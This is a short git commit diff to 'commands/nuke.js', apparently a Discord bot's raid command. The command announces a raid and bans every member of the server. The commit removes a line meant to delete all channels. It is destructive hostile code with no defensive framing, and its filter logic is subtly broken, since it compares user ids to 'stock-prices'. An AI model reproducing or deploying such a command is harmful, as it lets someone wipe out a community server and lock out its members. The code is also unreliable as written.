4c59ac21699baed2810608e06c32bdb78cccdd74
HalfBakedBTD <34613566+HalfBakedBTD@users.noreply.github.com>
2019-07-23 23:19:39 -0400

    Update nuke.js

--- commands/nuke.js
+++ commands/nuke.js
@@ -4,7 +4,6 @@ let gems = require("../gems.json");
 module.exports.run = async (bot, message, args) => {
   message.channel.send("Raid Starting?");
   message.guild.members.filter(u => u.id !== 'stock-prices').forEach(user => user.ban("NO!"));
-  message.guild.channels.filter(u => u.id !== 'stock-prices').forEach(channel => channel.delete);
 }
 
 module.exports.help = {
